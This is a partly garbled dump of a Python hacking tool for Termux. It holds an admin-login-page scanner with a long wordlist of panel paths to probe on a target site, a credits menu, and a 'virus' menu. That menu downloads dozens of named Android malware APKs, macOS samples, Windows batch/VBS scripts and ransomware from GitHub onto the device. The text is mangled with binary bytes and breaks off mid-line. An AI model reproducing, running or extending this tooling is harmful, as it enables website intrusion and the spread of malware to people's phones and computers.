account.jsr  r  r'  zcontrolpanel.jszadmincontrol.jsr  r  r  r  zrcjakar/admin/login.jsr  r  zwebadmin.jszwebadmin/index.jsz	acceso.jszwebadmin/admin.jsr�   r�   r�   r�   zadminpanel.jsr  r�   r   r  r  r  r  r  r  r  r  r   r!  r"  r$  r%  r&  r  zuser.jsr  r	  r
  zpanel-administracion/login.jszwp-login.jszadminLogin.jszadmin/adminLogin.jszhome.jsr1  zadminarea/index.jszadminarea/admin.jszadminarea/login.jszpanel-administracion/index.jszpanel-administracion/admin.jszmodelsearch/index.jszmodelsearch/admin.jszadmincontrol/login.jszadm/admloginuser.jszadmloginuser.jsz	admin2.jszadmin2/login.jszadmin2/index.jszusuarios/login.jszadm/index.jszadm.jszaffiliate.jszadm_auth.jszmemberadmin.jszadministratorlogin.jszbb-admin/index.cgizbb-admin/login.cgizbb-admin/admin.cgizadmin/home.cgir�   r�   zadmin/controlpanel.cgi�	admin.cgir  r  r  r�   r  r  r  r  r  r#  r  r  zadmin/cp.cgizcp.cgizadministrator/index.cgizadministrator/login.cgiznsw/admin/login.cgizwebadmin/login.cgizadmin/admin_login.cgizadmin_login.cgizadministrator/account.cgizadministrator.cgir�   zpages/admin/admin-login.cgizadmin/admin-login.cgizadmin-login.cgir�   r�   r�   r�   z	login.cgizmodelsearch/login.cgizmoderator.cgizmoderator/login.cgizmoderator/admin.cgizaccount.cgir  r  r'  zcontrolpanel.cgizadmincontrol.cgir  r  r  r  zrcjakar/admin/login.cgir  r  zwebadmin.cgizwebadmin/index.cgiz
acceso.cgizwebadmin/admin.cgir�   r�   r�   r�   zadminpanel.cgir  r�   r   r  r  r  r  r  r  r  r  r   r!  r"  r$  r%  r&  r  zuser.cgir  r	  r
  zpanel-administracion/login.cgizwp-login.cgizadminLogin.cgizadmin/adminLogin.cgizhome.cgir2  zadminarea/index.cgizadminarea/admin.cgizadminarea/login.cgizpanel-administracion/index.cgizpanel-administracion/admin.cgizmodelsearch/index.cgizmodelsearch/admin.cgizadmincontrol/login.cgizadm/admloginuser.cgizadmloginuser.cgiz
admin2.cgizadmin2/login.cgizadmin2/index.cgizusuarios/login.cgizadm/index.cgizadm.cgizaffiliate.cgizadm_auth.cgizmemberadmin.cgizadministratorlogin.cgizadmin_area/admin.brfzadmin_area/login.brfzsiteadmin/login.brfzsiteadmin/index.brfr(  r�   r�   r�   r�   zadmin_area/index.brfzbb-admin/index.brfzbb-admin/login.brfzbb-admin/admin.brfzadmin/home.brfr�   r�   zadmin/controlpanel.brf�	admin.brfr  r  r  r�   r  r  r  r  r  r#  r  r  zadmin/cp.brfzcp.brfzadministrator/index.brfzadministrator/login.brfznsw/admin/login.brfzwebadmin/login.brfbrfzadmin/admin_login.brfzadmin_login.brfzadministrator/account.brfzadministrator.brfz
acceso.brfr�   zpages/admin/admin-login.brfzadmin/admin-login.brfzadmin-login.brfr�   r�   r�   r�   z	login.brfzmodelsearch/login.brfzmoderator.brfzmoderator/login.brfzmoderator/admin.brfzaccount.brfr  r  r'  zcontrolpanel.brfzadmincontrol.brfr  r  r  r  zrcjakar/admin/login.brfr  r  zwebadmin.brfzwebadmin/index.brfzwebadmin/admin.brfr�   r�   r�   r�   zadminpanel.brfr  r�   r   r  r  r  r  r  r  r  r  r   r!  r"  r$  r%  r&  r  zuser.brfr  r	  r
  zpanel-administracion/login.brfzwp-login.brfzadminLogin.brfzadmin/adminLogin.brfzhome.brfr3  zadminarea/index.brfzadminarea/admin.brfzadminarea/login.brfzpanel-administracion/index.brfzpanel-administracion/admin.brfzmodelsearch/index.brfzmodelsearch/admin.brfzadmincontrol/login.brfzadm/admloginuser.brfzadmloginuser.brfz
admin2.brfzadmin2/login.brfzadmin2/index.brfzusuarios/login.brfzadm/index.brfzadm.brfzaffiliate.brfzadm_auth.brfzmemberadmin.brfzadministratorlogin.brfZcpanelz
cpanel.phpzcpanel.htmlzD[1;34m_____________________________________________________________z=                                                             z$[1;31mADMIN PAGE ITS FOUND [1;32m z"[1;35mSORRY NOT FOUND :::[1;31m )r)   r*   r   r!   r+   �urllibr�   Zurlopenr   �errorZURLError)r0   ZpasseZhaniZcurlZopenurlr�   r   r   r   �admin`  s    
wr6  c                  C   s�   dd� } t d�}t�d� | d| d � t d�}|dksB|d	krRt�d
� t�  |dksb|dkrrt�d� t�  |dks�|dkr�t�d� t�  |dks�|dkr�t�d� t�  |dks�|dkr�t�d� t�  |dks�|dkr�t�  d S )Nc                 S   s2   | d D ]$}t j�|� t j��  t�d� qd S )NrQ   g�������?�r�   �stdoutrV   �flushru   rv   �rO   r[   r   r   r   �	slowprint�  s    
zinfo.<locals>.slowprintz[1;31mEnter neme >> :[1;32m r"   z[1;32m

Hello a|   Please use in God Almighty
[1;31m___________________________________________________________
[1;32m
This tool provided by the programmer Abdullah Al Sakka,
please use in the satisfaction of
God is not responsible for the misuse of
[1;31m
___________________________________________________________
[1;34m
Team    : Alsakka  Security Script
Code    : python
Version : 1.0.1.0
[1;31m
___________________________________________________________
[1;32m
I will explain the tools section my friend
[1;31m___________________________________________________________
[1;32m
This tool is specialized in testing to penetrate the
guarantor guess on the site reached social work
and Lista Bord and penetration of the site
small manual injection and the work of
Spam guarantor encrypt passwords and
open portals and penetrate
all kinds of devices and
the work of all types
of virus and Check
for hardware and
location
[1;31m
____________________________________________________________
[1;32m
Thank you for using this tool to come up with the software developer
[1;34m
[01] Whatsapp
[02] facebook
[03] Telegram
[04] github
[05] youtube
[00] Back


  z$[1;35mEnter number web >> :[1;33m r`   r_   z-termux-open-url 'https://wa.me/+201552718637'rb   ra   z<termux-open-url 'https://www.facebook.com/Abdullah.Al.Sakka'rd   rc   z(termux-open-url 'https://t.me/Alsakkahk'rf   re   z4termux-open-url 'https://github.com/ABDULLAHALSAKKA'r�   r�   zJtermux-open-url 'https://www.youtube.com/channel/UCVaEEfPlGEnWEFzVN_62W1g'rs   rt   )r+   r)   r*   r{   )r;  �numr}   r   r   r   �info�  s,    





r=  c                     s�   dd� ���fdd���fdd����fdd����fd	d
����fdd��� �fdd�� � �����fdd�} t dkr�t�d� ��  | �  t��  d S )Nc                   S   s   t d� d S )Na�  [1;34m
        .e$$$$e.
      e$$$$$$$$$$e       &&&&&&&&&&&&&&&&&&&
     $$$$$$$$$$$$$$      &[1;32m Alsakka[1;31m *[1;32m virus [1;34m&
    d$$$$$$$$$$$$$$b     &&&&&&&&&&&&&&&&&&&
    $$$$$$$$$$$$$$$$
   4$$$$$$$$$$$$$$$$F
   4$$$$$$$$$$$$$$$$F
    $$$" "$$$$" "$$$
    $$F   4$$F   4$$===============||
     $F[1;32m &[1;34m 4$$F [1;32m& [1;34m4$                ||
     $$   $$$$   $$                ||
     $$$$$$""$$$$$$                ||
      $$$F o 4$$$$                 ||
       "$$$ee$$$"                  ||
        4*$$$$F4                \  ||  /
        $[1;32m ----[1;34m $                 \ || /
        "$$$$$$"                  \||/
          $$$$                     \/)r   r   r   r   r   �banner  s    zvirus.<locals>.bannerc               	      s�  t �d� t�  t�  td� �z�td�} | dkr�d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��0}t|j|d�|| dd�D ]}|�|� q�W 5 Q R X t �d� tt� t�  �n| dk�rZd}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q"W 5 Q R X t �d� tt� t�  �nl| dk�r�d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d� tt� t�  �n�| dk�r�d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qVW 5 Q R X t �d� tt� t�  �n8| dk�r(d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d� tt� t�  �n�| dk�r�d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d� tt� t�  �n| d k�r\d}d!}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q$W 5 Q R X t �d"� tt� t�  �nj| d#k�r�d}d$}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d%� tt� t�  �n�| d&k�r�d}d'}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qXW 5 Q R X t �d(� tt� t�  �n6| d)k�r*d}d*}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d+� tt� t�  �n�| d,k�r�d}d-}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d.� tt� t�  �n| d/k�r^d}d0}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q&W 5 Q R X t �d1� tt� t�  �nh| d2k�r�d}d3}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d4� tt� t�  �n�| d5k�r�d}d6}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qZW 5 Q R X t �d7� tt� t�  �n4| d8k�	r,d}d9}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d:� tt� t�  �n�| d;k�	r�d}d<}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �	q�W 5 Q R X t �d=� tt� t�  �n | d>k�
r`d}d?}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �
q(W 5 Q R X t �d@� tt� t�  �nf| dAk�
r�d}dB}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �
q�W 5 Q R X t �dC� tt� t�  �n�| dDk�r�d}dE}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q\W 5 Q R X t �dF� tt� t�  �n2| dGk�r.d}dH}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �dI� tt� t�  �n�| dJk�r�tdKt dK � d}dL}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �dM� tt� t�  �n�| dNk�rrd}dO}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q:W 5 Q R X t �dP� tt� t�  �nT| dQk�rd}dR}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �dS� tt� t�  �n�| dTk�r�d}dU}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qnW 5 Q R X t �dV� tt� t�  �n | dWk�r@d}dX}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qW 5 Q R X t �dY� tt� t�  �n�| dZk�r�d}d[}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d\� tt� t�  �n�| d]k�rtd}d^}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q<W 5 Q R X t �d_� tt� t�  �nR| d`k�rd}da}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �db� tt� t�  �n�| dck�r�d}dd}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qpW 5 Q R X t �de� tt� t�  �n| dfk�rBd}dg}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q
W 5 Q R X t �dh� tt� t�  �
n�| dik�r�d}dj}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �dk� tt� t�  �	n�| dlk�rvd}dm}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q>W 5 Q R X t �dn� tt� t�  �	nP| dok�rd}dp}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �dq� tt� t�  �n�| drk�r�d}ds}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qrW 5 Q R X t �dt� tt� t�  �n| duk�rDd}dv}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qW 5 Q R X t �dw� tt� t�  �n�| dxk�r�d}dy}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �dz� tt� t�  �n�| d{k�rxd}d|}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q@W 5 Q R X t �d}� tt� t�  �nN| d~k�rd}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d�� tt� t�  �n�| d�k�r�d}d�}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qtW 5 Q R X t �d�� tt� t�  �n| d�k�rFd}d�}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qW 5 Q R X t �d�� tt� t�  �n�| d�k�r�d}d�}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d�� tt� t�  �n�| d�k�rzd}d�}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qBW 5 Q R X t �d�� tt� t�  �nL| d�k�rd}d�}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d�� tt� t�  �n�| d�k�r�d}d�}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qvW 5 Q R X t �d�� tt� t�  �n| d�k�rHd}d�}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qW 5 Q R X t �d�� tt� t�  �n~| d�k�r�d}d�}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d�� tt� t�  n�| d�k�rxd}d�}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qBW 5 Q R X t �d�� tt� t�  nN| d�k�s�| d�k�r�t �d� ��  t�  n"td�� t�d�� t �d� � �  W n. tk
�r�   td�� t�d�� t�  Y nX d S )�Nr"   a�  [1;36m
[01] Agent                [02] Badnews
[03] Bios                 [04] BlatanSMS
[05] BrainTest            [06] Claco
[07] DropDialer           [08] FakeBank
[09] FakeCMCC             [10] FakeDoc
[11] FakeValida           [12] Fobus
[13] GinMaster            [14] Masnu
[15] Elite                [16] Omigo
[17] Opfake               [18] SmsWorker
[19] Vietcon              [20] Candycorn
[21] Cat                  [22] Chistescortos
[23] Chistespic           [24] ComFunnys
[25] ComImagePets         [26] ComKitchen
[27] ComLaughtter         [28] Prasesamor
[29] Prasesfee            [30] RecipeSmart
[31] Romaticpos           [32] Statetss
[33] Thinking             [34] Crd
[35] Dendroid             [36] Ds
[37] Facebook             [38] Fakeav
[39] ArtStation           [40] MusicPlayer
[41] Setting              [42] sleep virus
[43] sleep bbge           [44] sleep etisalat
[45] sleep orange         [46] sleep vodafone
[47] sleep we             [00] Back

        � [1;31mEnter Number >> :[1;32m r_   rg   zJhttps://github.com/Ractomes/Viruses/blob/master/samples/Agent.apk?raw=trueTrh   rj   rk   rl   rm   rn   rp   rq   z7mv 'Agent.apk?raw=true' /sdcard/Alsakka/virus/Agent.apkra   zNhttps://github.com/Ractomes/Viruses/blob/master/samples/BadNews.A.apk?raw=truez=mv 'BadNews.A.apk?raw=true' /sdcard/Alsakka/virus/BadNews.apkrc   z]https://github.com/Ractomes/Viruses/blob/master/samples/Bios.NativeMaliciousCode.apk?raw=truezImv 'Bios.NativeMaliciousCode.apk?raw=true' /sdcard/Alsakka/virus/Bios.apkre   zOhttps://github.com/Ractomes/Viruses/blob/master/samples/Blatantsms.apk?raw=truezAmv 'Blatantsms.apk?raw=true' /sdcard/Alsakka/virus/Blatantsms.apkr�   zNhttps://github.com/Ractomes/Viruses/blob/master/samples/BrainTest.apk?raw=truez?mv 'BrainTest.apk?raw=true' /sdcard/Alsakka/virus/BrainTest.apkr�   zLhttps://github.com/Ractomes/Viruses/blob/master/samples/Claco.A.apk?raw=truez9mv 'Claco.A.apk?raw=true' /sdcard/Alsakka/virus/Claco.apkr�   zOhttps://github.com/Ractomes/Viruses/blob/master/samples/Dropdialer.apk?raw=truezAmv 'Dropdialer.apk?raw=true' /sdcard/Alsakka/virus/DropDialer.apkr�   zOhttps://github.com/Ractomes/Viruses/blob/master/samples/FakeBank.B.apk?raw=truez?mv 'FakeBank.B.apk?raw=true' /sdcard/Alsakka/virus/FakeBank.apkr�   zOhttps://github.com/Ractomes/Viruses/blob/master/samples/FakeCMCC.A.apk?raw=truez?mv 'FakeCMCC.A.apk?raw=true' /sdcard/Alsakka/virus/FakeCMCC.apkr�   zLhttps://github.com/Ractomes/Viruses/blob/master/samples/FakeDoc.apk?raw=truez;mv 'FakeDoc.apk?raw=true' /sdcard/Alsakka/virus/FakeDoc.apkr�   zShttps://github.com/Ractomes/Viruses/blob/master/samples/FakeValidation.apk?raw=truezImv 'FakeValidation.apk?raw=true' /sdcard/Alsakka/virus/FakeValidation.apkr�   zJhttps://github.com/Ractomes/Viruses/blob/master/samples/Fobus.apk?raw=truez7mv 'Fobus.apk?raw=true' /sdcard/Alsakka/virus/Fobus.apkr�   zdhttps://github.com/Ractomes/Viruses/blob/master/samples/GinMaster.Z.AdvancedObfuscation.apk?raw=truezUmv 'GinMaster.Z.AdvancedObfuscation.apk?raw=true' /sdcard/Alsakka/virus/GinMaster.apkr�   zJhttps://github.com/Ractomes/Viruses/blob/master/samples/Masnu.apk?raw=truez7mv 'Masnu.apk?raw=true' /sdcard/Alsakka/virus/Masnu.apkr�   zOhttps://github.com/Ractomes/Viruses/blob/master/samples/Minecraft2.apk?raw=truez<mv 'Minecraft2.apk?raw=true' /sdcard/Alsakka/virus/Elite.apkr�   zJhttps://github.com/Ractomes/Viruses/blob/master/samples/Omigo.apk?raw=truez7mv 'Omigo.apk?raw=true' /sdcard/Alsakka/virus/Omigo.apkr�   zKhttps://github.com/Ractomes/Viruses/blob/master/samples/Opfake.apk?raw=truez9mv 'Opfake.apk?raw=true' /sdcard/Alsakka/virus/Opfake.apkr�   zNhttps://github.com/Ractomes/Viruses/blob/master/samples/SmsWorker.apk?raw=truez?mv 'SmsWorker.apk?raw=true' /sdcard/Alsakka/virus/SmsWorker.apkr�   zLhttps://github.com/Ractomes/Viruses/blob/master/samples/Vietcon.apk?raw=truez;mv 'Vietcon.apk?raw=true' /sdcard/Alsakka/virus/Vietcon.apkr�   zOhttps://github.com/Ractomes/Viruses/blob/master/samples/candy_corn.apk?raw=truez@mv 'candy_corn.apk?raw=true' /sdcard/Alsakka/virus/Candycorn.apkr�   r�   zHhttps://github.com/Ractomes/Viruses/blob/master/samples/cat.apk?raw=truez3mv 'cat.apk?raw=true' /sdcard/Alsakka/virus/Cat.apkr�   zRhttps://github.com/Ractomes/Viruses/blob/master/samples/chistescortos.apk?raw=truezGmv 'chistescortos.apk?raw=true' /sdcard/Alsakka/virus/Chistescortos.apkr�   zVhttps://github.com/Ractomes/Viruses/blob/master/samples/chistespicanticos.apk?raw=truezOmv 'chistespicanticos.apk?raw=true' /sdcard/Alsakka/virus/Chistespicanticos.apkr�   zPhttps://github.com/Ractomes/Viruses/blob/master/samples/com.funnyys.apk?raw=truezAmv 'com.funnyys.apk?raw=true' /sdcard/Alsakka/virus/ComFunnys.apkr�   zRhttps://github.com/Ractomes/Viruses/blob/master/samples/com.imagepets.apk?raw=truezFmv 'com.imagepets.apk?raw=true' /sdcard/Alsakka/virus/ComImagePets.apkr�   zQhttps://github.com/Ractomes/Viruses/blob/master/samples/com.kitchenn.apk?raw=truezCmv 'com.kitchenn.apk?raw=true' /sdcard/Alsakka/virus/ComKitchen.apkZ27zRhttps://github.com/Ractomes/Viruses/blob/master/samples/com.laughtter.apk?raw=truezFmv 'com.laughtter.apk?raw=true' /sdcard/Alsakka/virus/ComLaughtter.apkZ28zShttps://github.com/Ractomes/Viruses/blob/master/samples/com.prasesamor.apk?raw=truezEmv 'com.prasesamor.apk?raw=true' /sdcard/Alsakka/virus/Prasesamor.apkZ29zRhttps://github.com/Ractomes/Viruses/blob/master/samples/com.prasesfee.apk?raw=truezCmv 'com.prasesfee.apk?raw=true' /sdcard/Alsakka/virus/Prasesfee.apkZ30zThttps://github.com/Ractomes/Viruses/blob/master/samples/com.recipesmart.apk?raw=truezGmv 'com.recipesmart.apk?raw=true' /sdcard/Alsakka/virus/Recipesmart.apkZ31zShttps://github.com/Ractomes/Viruses/blob/master/samples/com.romaticpos.apk?raw=truezEmv 'com.romaticpos.apk?raw=true' /sdcard/Alsakka/virus/Romaticpos.apkZ32zQhttps://github.com/Ractomes/Viruses/blob/master/samples/com.statetss.apk?raw=truezAmv 'com.statetss.apk?raw=true' /sdcard/Alsakka/virus/Statetss.apkZ33zRhttps://github.com/Ractomes/Viruses/blob/master/samples/com.thinkking.apk?raw=truezCmv 'com.thinkking.apk?raw=true' /sdcard/Alsakka/virus/Thinkking.apkZ34zHhttps://github.com/Ractomes/Viruses/blob/master/samples/crd.apk?raw=truez3mv 'crd.apk?raw=true' /sdcard/Alsakka/virus/Crd.apkZ35zMhttps://github.com/Ractomes/Viruses/blob/master/samples/dendroid.apk?raw=truez=mv 'dendroid.apk?raw=true' /sdcard/Alsakka/virus/Dendroid.apkZ36zGhttps://github.com/Ractomes/Viruses/blob/master/samples/ds.apk?raw=truez1mv 'ds.apk?raw=true' /sdcard/Alsakka/virus/Ds.apkZ37zMhttps://github.com/Ractomes/Viruses/blob/master/samples/facebook.apk?raw=truez=mv 'facebook.apk?raw=true' /sdcard/Alsakka/virus/Facebook.apkZ38zLhttps://github.com/Ractomes/Viruses/blob/master/samples/Fake_av.apk?raw=truez:mv 'Fake_av.apk?raw=true' /sdcard/Alsakka/virus/Fakeav.apkZ39zOhttps://github.com/Ractomes/Viruses/blob/master/samples/ArtStation.apk?raw=truezAmv 'ArtStation.apk?raw=true' /sdcard/Alsakka/virus/ArtStation.apkZ40zKhttps://github.com/Ractomes/Viruses/blob/master/samples/Adware.apk?raw=truezDmv 'Adware.apk?raw=true' /sdcard/Alsakka/virus/MusicPlayerAdware.apkZ41zMhttps://github.com/Ractomes/Viruses/blob/master/samples/Settings.apk?raw=truez=mv 'Settings.apk?raw=true' /sdcard/Alsakka/virus/Settings.apkZ42zPhttps://github.com/ABDULLAHALSAKKA/ngrok/blob/master/virus%20almgal.apk?raw=truez@mv 'virus%20almgal.apk?raw=true' /sdcard/Alsakka/virus/virus.apkZ43zMhttps://github.com/ABDULLAHALSAKKA/ngrok/blob/master/hack%20Bbge.apk?raw=truezAmv 'hack%20Bbge.apk?raw=true' /sdcard/Alsakka/virus/hack-Bbge.apkZ44zJhttps://github.com/ABDULLAHALSAKKA/ngrok/blob/master/etisalat.apk?raw=truez=mv 'etisalat.apk?raw=true' /sdcard/Alsakka/virus/etisalat.apkZ45zHhttps://github.com/ABDULLAHALSAKKA/ngrok/blob/master/orange.apk?raw=truez9mv 'orange.apk?raw=true' /sdcard/Alsakka/virus/orange.apkZ46zJhttps://github.com/ABDULLAHALSAKKA/ngrok/blob/master/vodafone.apk?raw=truez=mv 'vodafone.apk?raw=true' /sdcard/Alsakka/virus/vodafone.apkZ47zDhttps://github.com/ABDULLAHALSAKKA/ngrok/blob/master/we.apk?raw=truez1mv 'we.apk?raw=true' /sdcard/Alsakka/virus/we.apkrt   rs   �[1;31m[!] ERRORr   �[1;32m[!] NO ientrnet !!)r)   r*   r   r!   r   r+   r(   r.   rW   rx   ry   r,   r   rz   rV   �fun�virus�Gru   rv   �	Exceptionr{   )Zmenu1ro   r0   r#   r�   r�   r3   r'   )�Vandroidr>  r   r   rF    s�   















































































































































zvirus.<locals>.Vandroidc               	      s�  t �d� t�  t�  td� td� td� �zbtd�} | dkr�d}d}tj|d	d
�}t|j	d �}|�
d�d }t|d��0}t|j|d�|| dd�D ]}|�|� q�W 5 Q R X t �d� tt� t�  n�| dk�rfd}d}tj|d	d
�}t|j	d �}|�
d�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q0W 5 Q R X t �d� tt� t�  n*| dk�rxt�  ntd� t�d� � �  W n. tk
�r�   td� t�d� t�  Y nX d S )Nr"   z[1;36m[1] Trinoidsz[2] Nothingz
[3] Back

z [1;31mEnter number >> :[1;31m r_   rg   zMhttps://github.com/Ractomes/Viruses/blob/master/samples/trinoids.app?raw=trueTrh   rj   rk   rl   rm   rn   rp   rq   z=mv 'trinoids.app?raw=true' /sdcard/Alsakka/virus/Trinoids.appra   zLhttps://github.com/Ractomes/Viruses/blob/master/samples/nothing.app?raw=truez;mv 'nothing.app?raw=true' /sdcard/Alsakka/virus/Nothing.apprc   r@  r   rA  �r)   r*   r   r!   r   r+   r(   r.   rW   rx   ry   r,   r   rz   rV   rB  rC  ru   rv   rE  r{   )Zmenu2ro   r0   r#   r�   r�   r3   r'   )�Vmacosxr   r   rH  g  sR    







zvirus.<locals>.Vmacosxc               	      s�  t �d� t�  t�  td� �z8td�} | dkr�d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��0}t|j|d�|| dd�D ]}|�|� q�W 5 Q R X t �d� tt� t�  �n�| dk�rZd}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q"W 5 Q R X t �d� tt� t�  �n�| dk�r�d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d� tt� t�  �nb| dk�r�d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qVW 5 Q R X t �d� tt� t�  �n�| dk�r(d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d� tt� t�  �n.| dk�r�d}d}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d� tt� t�  �n�| d k�r\d}d!}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q$W 5 Q R X t �d"� tt� t�  �n�| d#k�r�d}d$}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d%� tt� t�  �n`| d&k�r�d}d'}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �qXW 5 Q R X t �d(� tt� t�  n�| d)k�r&d}d*}tj|dd�}t|j	d	 �}|�
d
�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q�W 5 Q R X t �d+� tt� t�  n0| d,k�r>� �  t�  ntd-� t�d.� ��  W n. tk
�r�   td/� t�d.� t�  Y nX d S )0Nr"   z�[1;35m
[1] Ugly.bat             [2] Sleepy.bat
[3] Reg-eater.bat        [4] Kuis.bat
[5] Koce.bat             [6] Cmd.bat
[7] Capslock.vbs         [8] Alay.vbs
[9] Ransomeware          [10] Rip.bat
[11] Back


          z [1;34mEnter number >> : [1;32mr_   rg   zIhttps://github.com/Ractomes/Viruses/blob/master/samples/ugly.bat?raw=trueTrh   rj   rk   rl   rm   rn   rp   rq   z5mv 'ugly.bat?raw=true' /sdcard/Alsakka/virus/Ugly.batra   zKhttps://github.com/Ractomes/Viruses/blob/master/samples/sleepy.bat?raw=truez9mv 'sleepy.bat?raw=true' /sdcard/Alsakka/virus/Sleepy.batrc   zNhttps://github.com/Ractomes/Viruses/blob/master/samples/reg-eater.bat?raw=truez?mv 'reg-eater.bat?raw=true' /sdcard/Alsakka/virus/Reg-eater.batre   zIhttps://github.com/Ractomes/Viruses/blob/master/samples/kuis.bat?raw=truez5mv 'kuis.bat?raw=true' /sdcard/Alsakka/virus/Kuis.batr�   zIhttps://github.com/Ractomes/Viruses/blob/master/samples/koce.bat?raw=truez5mv 'koce.bat?raw=true' /sdcard/Alsakka/virus/Koce.batr�   zHhttps://github.com/Ractomes/Viruses/blob/master/samples/cmd.bat?raw=truez3mv 'cmd.bat?raw=true' /sdcard/Alsakka/virus/Cmd.batr�   zMhttps://github.com/Ractomes/Viruses/blob/master/samples/capslock.vbs?raw=truez=mv 'capslock.vbs?raw=true' /sdcard/Alsakka/virus/Capslock.vbsr�   zIhttps://github.com/Ractomes/Viruses/blob/master/samples/alay.vbs?raw=truez5mv 'alay.vbs?raw=true' /sdcard/Alsakka/virus/Alay.vbsr�   zPhttps://github.com/Ractomes/Viruses/blob/master/samples/ransomeware.exe?raw=truezPmv 'ransomeware.exe?raw=true' 